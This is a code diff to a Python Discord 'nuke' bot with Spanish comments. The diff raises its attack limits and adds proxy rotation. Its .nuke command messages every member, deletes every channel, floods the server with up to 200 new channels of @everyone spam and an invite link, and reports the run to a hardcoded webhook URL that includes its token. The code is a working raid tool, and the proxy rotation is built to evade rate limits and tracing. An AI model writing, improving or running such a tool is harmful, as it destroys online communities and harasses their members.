@@ -7,11 +7,7 @@ import os
 import aiohttp
 
 # --- CONFIGURACIÓN DE INTENTOS ---
-intents = discord.Intents.default()
-intents.guilds = True
-intents.guild_messages = True
-intents.message_content = True
-intents.members = True
+intents = discord.Intents.all()  # Usar todos los intents para mayor flexibilidad
 
 bot = commands.Bot(command_prefix='.', intents=intents)
 
@@ -23,32 +19,59 @@ channel_names = [
     "RATIO"
 ]
 
-TARGET_CHANNELS = 100
-TARGET_PINGS = 1000
-CONCURRENCY_LIMIT = 25
+TARGET_CHANNELS = 200  # Aumentado al máximo
+TARGET_PINGS = 2000  # Aumentado al máximo
+CONCURRENCY_LIMIT = 100  # Aumentado al máximo
+
 LOG_CHANNEL_NAME = "﹗logs"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1438649141851979776/p8c52p4cNv7SGBXkz0L_liPgD2_3D5p2TjDZfQTRTGAH2FyNO452lUHmqIAyrG4m0cyp"  # <-- cámbialo si quieres
 MESSAGE_TO_MEMB = "You have been invaded by voidxn"
 
-# Configuración del proxy
-PROXY_URL = "http//:138.201.245.91:8080"  # Reemplaza con tu proxy
-# Ejemplo: PROXY_URL = "http://108.162.192.113"
+# Configuración de Proxies
+PROXY_LIST = [
+    "http://138.201.245.91:8080",
+    # Agrega muchos más proxies aquí
+]
+
+ACTIVE_PROXIES = []
+PROXY_CHECK_INTERVAL = 30  # Verificar proxies cada 30 segundos
 
 semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
 
-def clear_console():
+async def clear_console():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 async def console_clear_task():
     while True:
         await asyncio.sleep(2)
-        clear_console()
+        await clear_console()
         print(f"[{time.strftime('%H:%M:%S')}] Consola limpiada. Bot activo.")
 
-@bot.event
-async def on_ready():
-    print(f'¡Conectado! {bot.user.name} ha tomado el control del mainframe.')
-    bot.loop.create_task(console_clear_task())
+async def is_proxy_working(proxy):
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://www.google.com", proxy=proxy, timeout=5) as response:
+                return response.status == 200
+    except:
+        return False
+
+async def update_active_proxies():
+    global ACTIVE_PROXIES
+    ACTIVE_PROXIES = [proxy for proxy in PROXY_LIST if await is_proxy_working(proxy)]
+    print(f"Proxies activos: {len(ACTIVE_PROXIES)}")
+
+async def proxy_check_task():
+    while True:
+        await update_active_proxies()
+        await asyncio.sleep(PROXY_CHECK_INTERVAL)
+
+async def get_proxy():
+    if not ACTIVE_PROXIES:
+        print("No hay proxies activos. Esperando...")
+        await update_active_proxies()
+        if not ACTIVE_PROXIES:
+            return None
+    return random.choice(ACTIVE_PROXIES)
 
 async def send_message_to_members(guild, message):
     for member in guild.members:
@@ -77,7 +100,7 @@ async def create_log_channel_and_send_embed(guild, ctx, start_time, duration):
 
     await log_channel.send(embed=embed)
 
-async def send_embed_via_webhook(guild, ctx, start_time, duration):
+async def send_embed_via_webhook(guild, ctx, start_time, duration, proxy=None):
     data = {
         "username": "Nuke Bot",
         "embeds": [{
@@ -88,45 +111,66 @@ async def send_embed_via_webhook(guild, ctx, start_time, duration):
     }
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.post(WEBHOOK_URL, json=data, proxy=PROXY_URL) as response:
-                if response.status != 204:
-                    print(f"Error al enviar webhook: {response.status}")
+            if proxy:
+                async with session.post(WEBHOOK_URL, json=data, proxy=proxy) as response:
+                    if response.status != 204:
+                        print(f"Error al enviar webhook: {response.status}")
+            else:
+                async with session.post(WEBHOOK_URL, json=data) as response:
+                    if response.status != 204:
+                        print(f"Error al enviar webhook: {response.status}")
     except Exception as e:
         print(f"Error al enviar webhook: {e}")
 
+async def create_and_ping(ctx, channel_name, proxy=None):
+    try:
+        ch = await ctx.guild.create_text_channel(channel_name)
+        for _ in range(TARGET_PINGS // TARGET_CHANNELS):
+            try:
+                await ch.send(f'@everyone Nuked by Bigm https://discord.gg/Duhk3RTsfA')
+            except Exception as e:
+                print(f"Error al enviar mensaje: {e}")
+    except Exception as e:
+        print(f"Error al crear/enviar mensaje: {e}")
+
 @bot.command(name='nuke')
 @commands.has_permissions(administrator=True)
-async def create_and_delete_channels(ctx):
+async def nuke(ctx):
     start_time = time.time()
+    guild = ctx.guild
 
-    await send_message_to_members(ctx.guild, MESSAGE_TO_MEMBERS)
+    await send_message_to_members(guild, MESSAGE_TO_MEMB)
 
-    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
+    # Eliminar canales existentes
+    delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks, return_exceptions=True)
 
-    async def create_and_ping(i):
-        async with semaphore:
-            try:
-                name = random.choice(channel_names)
-                ch = await ctx.guild.create_text_channel(f'{name}-{i}')
-                for _ in range(TARGET_PINGS // TARGET_CHANNELS):
-                    try:
-                        await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')
-                    except discord.errors.RateLimitError as e:
-                        print(f"RateLimitError: Esperando {e.retry_after} segundos.")
-                        await asyncio.sleep(e.retry_after)
-                        await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')  # Reintenta enviar
-            except Exception as e:
-                print(f"Error al crear/enviar mensaje: {e}")
+    channel_creation_tasks = []
+    for i in range(1, TARGET_CHANNELS + 1):
+        channel_name = random.choice(channel_names) + f"-{i}"
+        proxy = await get_proxy()  # Obtener un proxy para cada canal
+        channel_creation_tasks.append(create_and_ping(ctx, channel_name, proxy))
 
-    tasks = [create_and_ping(i) for i in range(1, TARGET_CHANNELS + 1)]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    await asyncio.gather(*channel_creation_tasks, return_exceptions=True)
 
     duration = time.time() - start_time
-    await create_log_channel_and_send_embed(ctx.guild, ctx, start_time, duration)
-    await send_embed_via_webhook(ctx.guild, ctx, start_time, duration)
+    await create_log_channel_and_send_embed(guild, ctx, start_time, duration)
+    await send_embed_via_webhook(guild, ctx, start_time, duration)
 
     await ctx.send(f'Nuke complete in {duration:.2f}s.')
+
+@bot.event
+async def on_ready():
+    print(f'¡Conectado! {bot.user.name} ha tomado el control del mainframe.')
+    bot.loop.create_task(console_clear_task())
+    bot.loop.create_task(proxy_check_task())  # Iniciar la verificación de proxies
+
+# Iniciar la verificación de proxies al inicio
+async def start_proxy_check():
+    await bot.wait_until_ready()
+    await update_active_proxies()
+
+bot.loop.create_task(start_proxy_check())
 
 print("Bot is running...")
 
